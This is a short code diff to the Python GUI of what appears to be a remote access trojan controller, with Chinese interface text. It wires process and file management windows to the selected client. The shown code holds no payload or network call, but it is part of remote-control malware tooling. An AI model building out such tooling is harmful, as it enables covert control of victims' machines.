@@ -9,6 +9,9 @@ from server import RAT_SERVER
 import threading
 from modules.generate_client_demo import generate_client
 from modules.terminal import Terminal
+from modules.process import Process
+from modules.file import File
+
 class ratGUI:
     """
     RAT GUI
@@ -209,7 +212,13 @@ class ratGUI:
         generate_client(self.root)
         
     def process_management(self):
-        messagebox.showinfo("进程管理", "进程管理功能")
+        '''
+        进程管理
+        '''
+        if self.current_client is None:
+            messagebox.showerror("错误", "请先选择一个客户端")
+            return
+        proc = Process(self.root, *self.current_client)
 
     def window_management(self):
         messagebox.showinfo("窗口管理", "窗口管理功能")
@@ -218,7 +227,13 @@ class ratGUI:
         messagebox.showinfo("桌面管理", "桌面管理功能")
 
     def file_management(self):
-        messagebox.showinfo("文件管理", "文件管理功能")
+        '''
+        文件管理
+        '''
+        if self.current_client is None:
+            messagebox.showerror("错误", "请先选择一个客户端")
+            return
+        file = File(self.root, *self.current_client)
 
     def language_management(self):
         messagebox.showinfo("语言管理", "语言管理功能")
